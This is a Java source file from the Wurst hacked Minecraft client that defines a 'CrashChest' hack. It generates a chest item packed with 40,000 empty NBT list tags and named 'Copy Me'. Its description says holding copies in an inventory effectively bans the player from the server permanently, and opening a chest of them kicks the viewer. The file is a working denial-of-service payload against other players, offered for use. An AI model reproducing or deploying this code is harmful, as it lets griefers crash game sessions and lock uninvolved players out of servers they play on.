/*
 * Copyright (c) 2014-2021 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import net.minecraft.block.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.text.LiteralText;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;

@SearchTags({"crash chest"})
public final class CrashChestHack extends Hack
{
	public CrashChestHack()
	{
		super("CrashChest", "Generates a chest that essentially bans people\n"
			+ "from the server if they have too many copies\n"
			+ "of it in their inventory. \u00a7c\u00a7lWARNING:\u00a7r \u00a7cThis cannot\n"
			+ "\u00a7cbe undone. Use with caution!\u00a7r\n\n"
			+ "If copies are instead placed in a chest, anyone\n"
			+ "who opens the chest will be kicked from the\n"
			+ "server (just once).");
		
		setCategory(Category.ITEMS);
	}
	
	@Override
	public void onEnable()
	{
		if(!MC.player.abilities.creativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		
		if(!MC.player.inventory.getArmorStack(0).isEmpty())
		{
			ChatUtils.error("Please clear your shoes slot.");
			setEnabled(false);
			return;
		}
		
		// generate item
		ItemStack stack = new ItemStack(Blocks.CHEST);
		CompoundTag nbtCompound = new CompoundTag();
		ListTag nbtList = new ListTag();
		for(int i = 0; i < 40000; i++)
			nbtList.add(new ListTag());
		nbtCompound.put("www.wurstclient.net", nbtList);
		stack.setTag(nbtCompound);
		stack.setCustomName(new LiteralText("Copy Me"));
		
		// give item
		MC.player.inventory.armor.set(0, stack);
		ChatUtils.message("Item has been placed in your shoes slot.");
		setEnabled(false);
	}
}
